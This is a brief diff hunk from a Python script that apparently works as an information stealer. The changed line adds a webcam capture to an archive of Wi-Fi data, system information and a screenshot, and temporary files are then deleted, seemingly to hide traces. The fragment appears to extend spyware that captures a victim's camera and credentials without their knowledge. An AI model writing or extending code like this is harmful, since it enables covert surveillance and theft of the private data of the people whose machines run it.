@@ -74,7 +74,7 @@ def zip(name, files):
     except:
         pass
     
-zip("System.zip", ["wifi.txt", "system.txt", "screenshot.png"])
+zip("System.zip", ["wifi.txt", "system.txt", "screenshot.png", "webcam.png"])
 delete_files(["wifi.txt", "system.txt"]) #delete_files(["wifi.txt", "system.txt", "screenshot.png"])
 
 zip_files = []
